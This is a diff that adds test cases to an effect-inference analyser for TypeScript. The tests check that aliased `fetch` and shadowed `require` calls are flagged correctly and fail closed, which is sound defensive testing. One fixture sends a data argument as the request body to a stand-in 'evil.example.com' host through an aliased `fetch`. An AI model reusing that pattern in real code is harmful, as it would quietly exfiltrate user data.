@@ -10668,6 +10668,61 @@ if (blk()) {
         !eff(rRes, "viaPath") && !eff(rRes, "viaPromise"),
         JSON.stringify((rRes.functions || []).map((f) => f.fn)));
 
+  // THE RESOLVE ARM'S FABRICATION SURFACE, found by review: the rule matched on callee TEXT with no
+  // shadow guard, while its own sibling (the `require(m)` arm) carries one and says why. A project's own
+  // `require` shim, a DI-injected `require` parameter, and a function merely NAMED `fakecreateRequire`
+  // all charged Fs for a pure local call.
+  run(`import { createRequire } from "node:module";\n`
+    + `const pure = (s: string) => s.toUpperCase();\n`
+    + `export function objShadow() { const require = { resolve: pure }; return require.resolve("h"); }\n`
+    + `function fakecreateRequire() { return { resolve: pure }; }\n`
+    + `export function suffixTrap() { return fakecreateRequire().resolve("x"); }\n`
+    + `export function realCreate(cwd: string, n: string) { const r = createRequire(cwd); return r.resolve(n); }\n`
+    + `export function realRequire(n: string) { return require.resolve(n); }\n`,
+      "--out", path.join(d, "r"));
+  const rShadow = rep();
+  check("CONTROL: a project's own `require` shim fabricates no Fs — the resolve arm carries the shadow guard its sibling documents",
+        !eff(rShadow, "objShadow"), JSON.stringify(eff(rShadow, "objShadow")));
+  check("CONTROL: a function merely NAMED `fakecreateRequire` fabricates nothing — the match is on the callee's own name, not a suffix",
+        !eff(rShadow, "suffixTrap"), JSON.stringify(eff(rShadow, "suffixTrap")));
+  check("…while the REAL `createRequire(u).resolve` is still Fs — the guard resolves through the import alias, or node's own function would read as the project's",
+        (eff(rShadow, "realCreate")?.inferred || []).includes("Fs")
+          && (eff(rShadow, "realRequire")?.inferred || []).includes("Fs"),
+        JSON.stringify([eff(rShadow, "realCreate"), eff(rShadow, "realRequire")]));
+
+  // A MUTABLE binding is not its initializer. Reading `declarations[0].initializer` as the value made
+  // `let send = fetch; send = helper; send(url)` charge Net over a pure local (a fabrication this
+  // release introduced), and left `let send; send = fetch; send(url)` — the ASSIGNMENT spelling of the
+  // same cardinal sin — silently pure. Both resolve to Unknown: the value is genuinely not known.
+  run(`function helper(u: string): string { return u; }\n`
+    + `export function reassigned() { let s: any = fetch; s = helper; return s("https://a.example.com"); }\n`
+    + `export function assignSpelling(d: string) { let s: any; s = fetch; return s("https://evil.example.com/c", { body: d }); }\n`
+    + `export function constPrecise() { const s = fetch; return s("https://ok.example.com/v1"); }\n`
+    + `export function pureAlias() { const g = helper; return g("/x"); }\n`,
+      "--out", path.join(d, "r"));
+  const rMut = rep();
+  check("a REASSIGNED alias fabricates nothing — its initializer is not its value",
+        !(eff(rMut, "reassigned")?.inferred || []).includes("Net"), JSON.stringify(eff(rMut, "reassigned")));
+  check("…and it DISCLOSES rather than going silent (Unknown, not pure)",
+        (eff(rMut, "reassigned")?.inferred || []).includes("Unknown"), JSON.stringify(eff(rMut, "reassigned")));
+  check("the ASSIGNMENT spelling `let s; s = fetch; s(url)` is disclosed too — it was silently pure, which is the cardinal-sin direction",
+        (eff(rMut, "assignSpelling")?.inferred || []).includes("Unknown"), JSON.stringify(eff(rMut, "assignSpelling")));
+  check("CONTROL: a `const` alias is still resolved precisely, and a pure alias stays pure",
+        (eff(rMut, "constPrecise")?.inferred || []).includes("Net") && !eff(rMut, "pureAlias"),
+        JSON.stringify([eff(rMut, "constPrecise"), eff(rMut, "pureAlias")]));
+
+  // THE BUDGET CLIFF ITSELF — no row crossed ALIAS_HOPS, so the fail-closed arm that fixed my own
+  // fix's silent cliff could have reopened with nothing failing.
+  {
+    const hops = 20;
+    let src = "export function deep() {\n  const a0 = fetch;\n";
+    for (let i = 1; i < hops; i++) src += `  const a${i} = a${i - 1};\n`;
+    src += `  return a${hops - 1}("https://deep.example.com/v1");\n}\n`;
+    run(src, "--out", path.join(d, "r"));
+    check(`a ${hops}-deep chain CROSSES the budget and fails CLOSED (Unknown), never silently pure`,
+          (eff(rep(), "deep")?.inferred || []).includes("Unknown"), JSON.stringify(eff(rep(), "deep")));
+  }
+
   // CONTROL 2: aliasing an ordinary function must not become an effect.
   run(`function helper(x: number): number { return x + 1; }\n`
     + `export function pureAlias() { const g = helper; return g(1); }\n`, "--out", path.join(d, "r"));
